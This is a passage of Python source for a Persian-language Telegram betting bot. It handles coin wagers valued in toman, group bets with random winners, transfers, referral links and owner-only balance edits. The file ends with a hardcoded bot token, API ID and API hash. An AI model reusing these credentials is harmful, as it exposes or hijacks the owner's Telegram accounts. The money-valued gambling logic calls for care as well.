        """ایجاد شرط‌بندی گروهی"""
        user_id = update.message.from_user.id
        username = update.message.from_user.username or f"user_{user_id}"
        chat_id = update.message.chat_id
        
        # بررسی اینکه آیا در گروه هستیم
        if update.message.chat.type == 'private':
            await update.message.reply_text(
                "❌ این دستور فقط در گروه‌ها قابل استفاده است!\n"
                "لطفاً در یک گروه این دستور را ارسال کنید."
            )
            return
        
        if not context.args:
            await update.message.reply_text(
                "❌ لطفاً تعداد سکه شرط را مشخص کنید:\n"
                "مثال: `/gbet 10`"
            )
            return
        
        try:
            coin_amount = int(context.args[0])
            if coin_amount <= 0:
                await update.message.reply_text("❌ تعداد سکه باید بیشتر از صفر باشد!")
                return
            
            if user_id not in self.user_coins or self.user_coins[user_id] < coin_amount:
                await update.message.reply_text(
                    f"❌ موجودی سکه شما کافی نیست!\n"
                    f"💰 موجودی فعلی: {self.user_coins.get(user_id, 0)} سکه\n"
                    f"💸 سکه مورد نیاز: {coin_amount} سکه"
                )
                return
            
            bet_id = str(int(time.time()))
            self.group_bets[bet_id] = {
                'creator_id': user_id,
                'creator_username': username,
                'chat_id': chat_id,
                'coin_amount': coin_amount,
                'participants': [user_id],
                'message_id': None,
                'created_at': time.time()
            }
            
            self.user_coins[user_id] -= coin_amount
            
            bet_text = (
                f"🎰●شرط بندی گروهی●🎰\n\n"
                f"👤 سازنده: @{username}\n"
                f"💌 تعداد کوین: {coin_amount} سکه\n"
                f"💰 مبلغ: {coin_amount * 200:,} تومن\n"
                f"👥 شرکت‌کنندگان: 1 نفر\n\n"
                f"⏰ زمان باقی‌مانده: 5 دقیقه"
            )
            
            message = await update.message.reply_text(
                bet_text,
                reply_markup=self.create_group_bet_keyboard(bet_id)
            )
            
            self.group_bets[bet_id]['message_id'] = message.message_id
            
            # زمان‌بندی برای پایان شرط
            asyncio.create_task(self.finish_group_bet(bet_id, context))
            
        except ValueError:
            await update.message.reply_text("❌ لطفاً یک عدد معتبر وارد کنید!")
    
    async def finish_group_bet(self, bet_id: str, context: ContextTypes.DEFAULT_TYPE):
        """پایان دادن به شرط‌بندی گروهی پس از 5 دقیقه"""
        await asyncio.sleep(300)  # 5 دقیقه
        
        if bet_id not in self.group_bets:
            return
        
        bet = self.group_bets[bet_id]
        
        if len(bet['participants']) < 2:
            # بازگشت سکه‌ها به سازنده
            if bet['creator_id'] in self.user_coins:
                self.user_coins[bet['creator_id']] += bet['coin_amount']
            
            try:
                await context.bot.edit_message_text(
                    chat_id=bet['chat_id'],
                    message_id=bet['message_id'],
                    text=(
                        f"❌ شرط‌بندی گروهی لغو شد!\n\n"
                        f"👤 سازنده: @{bet['creator_username']}\n"
                        f"💌 تعداد کوین: {bet['coin_amount']} سکه\n"
                        f"💰 علت: تعداد شرکت‌کنندگان کافی نبود\n"
                        f"💎 سکه‌ها به حساب سازنده بازگردانده شد."
                    )
                )
            except:
                pass
            
            del self.group_bets[bet_id]
            return
        
        # انتخاب برنده
        winner_id = random.choice(bet['participants'])
        total_coins = bet['coin_amount'] * len(bet['participants'])
        
        if winner_id not in self.user_coins:
            self.user_coins[winner_id] = 0
        self.user_coins[winner_id] += total_coins
        
        # پیدا کردن نام برنده
        winner_username = bet['creator_username'] if winner_id == bet['creator_id'] else "یکی از شرکت‌کنندگان"
        
        result_text = (
            f"🎲شرط بندی گروهی انجام شد🎮\n\n"
            f"🏆 برنده: @{winner_username}\n"
            f"👥 تعداد شرکت‌کنندگان: {len(bet['participants'])} نفر\n"
            f"🪙 مجموع جوایز: {total_coins} سکه\n"
            f"💰 ارزش: {total_coins * 200:,} تومن\n"
            f"🔮 ساعت: {datetime.now().strftime('%H:%M:%S')}"
        )
        
        try:
            await context.bot.edit_message_text(
                chat_id=bet['chat_id'],
                message_id=bet['message_id'],
                text=result_text
            )
        except:
            pass
        
        # اطلاع به برنده
        try:
            await context.bot.send_message(
                chat_id=winner_id,
                text=f"🎉 شما در شرط‌بندی گروهی برنده شدید!\n💰 {total_coins} سکه به حساب شما اضافه شد!"
            )
        except:
            pass
        
        del self.group_bets[bet_id]
    
    async def join_bet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        username = query.from_user.username or f"user_{user_id}"
        bet_id = query.data.replace('join_bet_', '')
        
        if bet_id not in self.active_bets:
            await query.edit_message_text("❌ این شرط‌بندی منقضی شده است!")
            return
        
        bet = self.active_bets[bet_id]
        
        if user_id == bet['creator_id']:
            await query.answer("❌ شما سازنده این شرط هستید!", show_alert=True)
            return
        
        if user_id in bet['participants']:
            await query.answer("❌ شما قبلاً در این شرط شرکت کرده‌اید!", show_alert=True)
            return
        
        if user_id not in self.user_coins or self.user_coins[user_id] < bet['coin_amount']:
            await query.answer(
                f"❌ موجودی سکه شما کافی نیست!\n"
                f"💰 موجودی مورد نیاز: {bet['coin_amount']} سکه",
                show_alert=True
            )
            return
        
        bet['participants'].append(user_id)
        self.user_coins[user_id] -= bet['coin_amount']
        
        winner_id = random.choice(bet['participants'])
        loser_id = bet['creator_id'] if winner_id != bet['creator_id'] else user_id
        
        winner_username = bet['creator_username'] if winner_id == bet['creator_id'] else username
        loser_username = username if winner_id == bet['creator_id'] else bet['creator_username']
        
        total_coins = bet['coin_amount'] * 2
        if winner_id not in self.user_coins:
            self.user_coins[winner_id] = 0
        self.user_coins[winner_id] += total_coins
        
        del self.active_bets[bet_id]
        
        result_text = (
            f"🎲شرط بندی انجام شد🎮\n\n"
            f"🏆 برنده: @{winner_username}\n"
            f"🥀 بازنده: @{loser_username}\n"
            f"🪙 کوین: {total_coins} سکه\n"
            f"🔮 ساعت: {datetime.now().strftime('%H:%M:%S')}\n"
            f"🌋 مبلغ: {total_coins * 200:,} تومن"
        )
        
        await query.edit_message_text(result_text)
        
        try:
            await context.bot.send_message(
                chat_id=winner_id,
                text=f"🎉 شما در شرط‌بندی برنده شدید!\n💰 {total_coins} سکه به حساب شما اضافه شد!"
            )
        except:
            pass
        
        try:
            await context.bot.send_message(
                chat_id=loser_id,
                text=f"💔 متأسفانه در شرط‌بندی بازنده شدید.\n💎 {bet['coin_amount']} سکه از حساب شما کسر شد."
            )
        except:
            pass
    
    async def join_group_bet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        username = query.from_user.username or f"user_{user_id}"
        bet_id = query.data.replace('join_gbet_', '')
        
        if bet_id not in self.group_bets:
            await query.answer("❌ این شرط‌بندی منقضی شده است!", show_alert=True)
            return
        
        bet = self.group_bets[bet_id]
        
        if user_id in bet['participants']:
            await query.answer("❌ شما قبلاً در این شرط شرکت کرده‌اید!", show_alert=True)
            return
        
        if user_id not in self.user_coins or self.user_coins[user_id] < bet['coin_amount']:
            await query.answer(
                f"❌ موجودی سکه شما کافی نیست!\n"
                f"💰 موجودی مورد نیاز: {bet['coin_amount']} سکه",
                show_alert=True
            )
            return
        
        bet['participants'].append(user_id)
        self.user_coins[user_id] -= bet['coin_amount']
        
        remaining_time = 300 - (time.time() - bet['created_at'])
        minutes = int(remaining_time // 60)
        seconds = int(remaining_time % 60)
        
        updated_text = (
            f"🎰●شرط بندی گروهی●🎰\n\n"
            f"👤 سازنده: @{bet['creator_username']}\n"
            f"💌 تعداد کوین: {bet['coin_amount']} سکه\n"
            f"💰 مبلغ: {bet['coin_amount'] * 200:,} تومن\n"
            f"👥 شرکت‌کنندگان: {len(bet['participants'])} نفر\n\n"
            f"⏰ زمان باقی‌مانده: {minutes:02d}:{seconds:02d}"
        )
        
        await query.edit_message_text(
            updated_text,
            reply_markup=self.create_group_bet_keyboard(bet_id)
        )
        
        await query.answer(f"✅ شما با موفقیت به شرط پیوستید! {bet['coin_amount']} سکه از حساب شما کسر شد.")
    
    async def cancel_group_bet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        bet_id = query.data.replace('cancel_gbet_', '')
        
        if bet_id not in self.group_bets:
            await query.answer("❌ این شرط‌بندی منقضی شده است!", show_alert=True)
            return
        
        bet = self.group_bets[bet_id]
        
        if user_id != bet['creator_id']:
            await query.answer("❌ فقط سازنده شرط می‌تواند آن را لغو کند!", show_alert=True)
            return
        
        # بازگشت سکه‌ها به همه شرکت‌کنندگان
        for participant_id in bet['participants']:
            if participant_id in self.user_coins:
                self.user_coins[participant_id] += bet['coin_amount']
        
        await query.edit_message_text(
            f"❌ شرط‌بندی گروهی توسط سازنده لغو شد!\n\n"
            f"💌 تعداد کوین: {bet['coin_amount']} سکه\n"
            f"👥 شرکت‌کنندگان: {len(bet['participants'])} نفر\n"
            f"💎 سکه‌ها به حساب همه بازگردانده شد."
        )
        
        del self.group_bets[bet_id]
    
    async def create_invite_link(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.message.from_user.id
        username = update.message.from_user.username or f"user_{user_id}"
        
        invite_code = secrets.token_urlsafe(8)
        self.invite_links[invite_code] = user_id
        
        invite_link = f"https://t.me/{context.bot.username}?start={invite_code}"
        referrals_count = len(self.user_referrals.get(user_id, []))
        
        invite_text = (
            f"🎫 **لینک دعوت شما**\n\n"
            f"🔗 لینک: `{invite_link}`\n\n"
            f"💎 **مزایا:**\n"
            f"• به ازای هر دعوت: **7 سکه** پاداش\n"
            f"• دعوت شده: **3 سکه** هدیه اولیه\n"
            f"• بدون محدودیت تعداد دعوت\n\n"
            f"📊 آمار دعوت‌های شما: {referrals_count} نفر\n"
            f"💰 سکه‌های کسب شده: {referrals_count * 7} سکه"
        )
        
        await update.message.reply_text(invite_text, parse_mode='Markdown')
    
    async def show_balance(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self._show_balance(update, context)
    
    async def show_balance_farsi(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self._show_balance(update, context)
    
    async def _show_balance(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.message.from_user.id
        username = update.message.from_user.first_name or "کاربر"
        user_coins = self.user_coins.get(user_id, 0)
        total_value = user_coins * 200
        current_time = datetime.now().strftime("%H:%M:%S")
        
        balance_text = (
            f"🥃 کاربر: {username}\n"
            f"🚜 موجودی: {user_coins} سکه\n"
            f"🫟 قیمت: {total_value:,} تومن\n"
            f"🍺 ساعت: {current_time}"
        )
        
        await update.message.reply_text(balance_text)
    
    async def transfer_coins(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self._transfer_coins(update, context)
    
    async def transfer_coins_farsi(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self._transfer_coins(update, context)
    
    async def _transfer_coins(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.message.from_user.id
        username = update.message.from_user.username or f"user_{user_id}"
        
        if not update.message.reply_to_message:
            await update.message.reply_text(
                "❌ لطفاً روی پیام کاربر مورد نظر ریپلای کنید و دستور را ارسال نمایید:\n"
                "مثال: `انتقال 10` یا `/transfer 10`"
            )
            return
        
        message_text = update.message.text
        coin_amount = 0
        
        try:
            if message_text.startswith('/transfer') and context.args:
                coin_amount = int(context.args[0])
            elif message_text.startswith('انتقال'):
                parts = message_text.split()
                if len(parts) >= 2:
                    coin_amount = int(parts[1])
            else:
                await update.message.reply_text(
                    "❌ فرمت دستور نادرست است!\n"
                    "مثال: `انتقال 10` یا `/transfer 10`"
                )
                return
        except (ValueError, IndexError):
            await update.message.reply_text(
                "❌ لطفاً تعداد سکه را به درستی مشخص کنید:\n"
                "مثال: `انتقال 10` یا `/transfer 10`"
            )
            return
        
        if coin_amount <= 0:
            await update.message.reply_text("❌ تعداد سکه باید بیشتر از صفر باشد!")
            return
        
        if user_id not in self.user_coins or self.user_coins[user_id] < coin_amount:
            await update.message.reply_text(
                f"❌ موجودی سکه شما کافی نیست!\n"
                f"💰 موجودی فعلی: {self.user_coins.get(user_id, 0)} سکه\n"
                f"💸 سکه مورد نیاز: {coin_amount} سکه"
            )
            return
        
        target_user = update.message.reply_to_message.from_user
        target_user_id = target_user.id
        target_username = target_user.first_name or "کاربر"
        
        if target_user_id == user_id:
            await update.message.reply_text("❌ نمی‌توانید به خودتان سکه انتقال دهید!")
            return
        
        self.user_coins[user_id] -= coin_amount
        if target_user_id not in self.user_coins:
            self.user_coins[target_user_id] = 0
        self.user_coins[target_user_id] += coin_amount
        
        transfer_text = (
            f"💸 **انتقال سکه انجام شد**\n\n"
            f"👤 از: {username}\n"
            f"👥 به: {target_username}\n"
            f"💰 مبلغ: {coin_amount} سکه\n"
            f"💎 ارزش: {coin_amount * 200:,} تومن\n"
            f"🕐 زمان: {datetime.now().strftime('%H:%M:%S')}"
        )
        
        await update.message.reply_text(transfer_text)
        
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"🎉 شما {coin_amount} سکه از کاربر {username} دریافت کردید!\n"
                     f"💰 موجودی جدید: {self.user_coins[target_user_id]} سکه"
            )
        except:
            pass
    
    async def kasr_coins(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.message.from_user.id
        
        if not self.is_owner(user_id):
            await update.message.reply_text("❌ شما دسترسی به این دستور را ندارید!")
            return
        
        if not update.message.reply_to_message:
            await update.message.reply_text(
                "❌ لطفاً روی پیام کاربر مورد نظر ریپلای کنید و دستور را ارسال نمایید:\n"
                "مثال: `/kasr 10`"
            )
            return
        
        if not context.args:
            await update.message.reply_text(
                "❌ لطفاً تعداد سکه را مشخص کنید:\n"
                "مثال: `/kasr 10`"
            )
            return
        
        try:
            coin_amount = int(context.args[0])
            if coin_amount <= 0:
                await update.message.reply_text("❌ تعداد سکه باید بیشتر از صفر باشد!")
                return
            
            target_user = update.message.reply_to_message.from_user
            target_user_id = target_user.id
            target_username = target_user.first_name or "کاربر"
            
            current_coins = self.user_coins.get(target_user_id, 0)
            
            if current_coins < coin_amount:
                coins_to_deduct = current_coins
                self.user_coins[target_user_id] = 0
            else:
                coins_to_deduct = coin_amount
                self.user_coins[target_user_id] -= coin_amount
            
            kasr_text = (
                f"⚡ **کسر سکه توسط مالک**\n\n"
                f"👤 کاربر: {target_username}\n"
                f"🆔 آیدی: `{target_user_id}`\n"
                f"💰 مبلغ کسر شده: {coins_to_deduct} سکه\n"
                f"💎 موجودی جدید: {self.user_coins.get(target_user_id, 0)} سکه\n"
                f"🕐 زمان: {datetime.now().strftime('%H:%M:%S')}"
            )
            
            await update.message.reply_text(kasr_text)
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"⚠️ {coins_to_deduct} سکه از حساب شما توسط مالک کسر شد!\n"
                         f"💰 موجودی جدید: {self.user_coins.get(target_user_id, 0)} سکه"
                )
            except:
                pass
                
        except ValueError:
            await update.message.reply_text("❌ لطفاً یک عدد معتبر وارد کنید!")
    
    async def add_coins(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.message.from_user.id
        
        if not self.is_owner(user_id):
            await update.message.reply_text("❌ شما دسترسی به این دستور را ندارید!")
            return
        
        if not update.message.reply_to_message:
            await update.message.reply_text(
                "❌ لطفاً روی پیام کاربر مورد نظر ریپلای کنید و دستور را ارسال نمایید:\n"
                "مثال: `/addcoins 10`"
            )
            return
        
        if not context.args:
            await update.message.reply_text(
                "❌ لطفاً تعداد سکه را مشخص کنید:\n"
                "مثال: `/addcoins 10`"
            )
            return
        
        try:
            coin_amount = int(context.args[0])
            if coin_amount <= 0:
                await update.message.reply_text("❌ تعداد سکه باید بیشتر از صفر باشد!")
                return
            
            target_user = update.message.reply_to_message.from_user
            target_user_id = target_user.id
            target_username = target_user.first_name or "کاربر"
            
            if target_user_id not in self.user_coins:
                self.user_coins[target_user_id] = 0
            
            self.user_coins[target_user_id] += coin_amount
            
            add_text = (
                f"🎁 **افزودن سکه توسط مالک**\n\n"
                f"👤 کاربر: {target_username}\n"
                f"🆔 آیدی: `{target_user_id}`\n"
                f"💰 مبلغ افزوده شده: {coin_amount} سکه\n"
                f"💎 موجودی جدید: {self.user_coins.get(target_user_id, 0)} سکه\n"
                f"🕐 زمان: {datetime.now().strftime('%H:%M:%S')}"
            )
            
            await update.message.reply_text(add_text)
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"🎉 {coin_amount} سکه توسط مالک به حساب شما افزوده شد!\n"
                         f"💰 موجودی جدید: {self.user_coins.get(target_user_id, 0)} سکه"
                )
            except:
                pass
                
        except ValueError:
            await update.message.reply_text("❌ لطفاً یک عدد معتبر وارد کنید!")
    
    async def get_user_id(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.message.from_user.id
        
        if not self.is_owner(user_id):
            await update.message.reply_text("❌ شما دسترسی به این دستور را ندارید!")
            return
        
        if not update.message.reply_to_message:
            await update.message.reply_text(
                "❌ لطفاً روی پیام کاربر مورد نظر ریپلای کنید و دستور را ارسال نمایید:\n"
                "مثال: `/id`"
            )
            return
        
        target_user = update.message.reply_to_message.from_user
        target_user_id = target_user.id
        target_username = target_user.username or "ندارد"
        target_first_name = target_user.first_name or "ندارد"
        target_last_name = target_user.last_name or "ندارد"
        
        user_coins = self.user_coins.get(target_user_id, 0)
        total_value = user_coins * 200
        
        user_info_text = (
            f"👤 **اطلاعات کاربر**\n\n"
            f"🆔 **آیدی عددی:** `{target_user_id}`\n"
            f"👁️ **نام کاربری:** @{target_username}\n"
            f"📛 **نام:** {target_first_name}\n"
            f"📛 **نام خانوادگی:** {target_last_name}\n"
            f"💰 **تعداد سکه:** {user_coins}\n"
            f"💎 **ارزش سکه‌ها:** {total_value:,} تومن\n"
            f"🎯 **وضعیت سلف:** {'فعال' if target_user_id in self.active_selfbots else 'غیرفعال'}\n"
            f"📊 **تعداد دعوت‌ها:** {len(self.user_referrals.get(target_user_id, []))}\n"
            f"🕐 **زمان:** {datetime.now().strftime('%H:%M:%S')}"
        )
        
        await update.message.reply_text(user_info_text, parse_mode='Markdown')
    
    def run(self):
        print("🤖 ربات SelfStruct System در حال اجراست...")
        print("🔑 API ID:", self.api_id)
        print("👑 مالک ربات:", self.owner_id)
        print("💰 موجودی مالک: نامحدود")
        self.application.run_polling()

# تنظیمات اصلی
if __name__ == "__main__":
    BOT_TOKEN = "8348486326:AAFTnzN46PPya_OjV5dOMlCC7J4MRrsa0r8"
    API_ID = 2076999
    API_HASH = "024468605f872acb0fee68e613c66150"
    
    bot = TelegramAuthBot(BOT_TOKEN, API_ID, API_HASH)
    bot.run()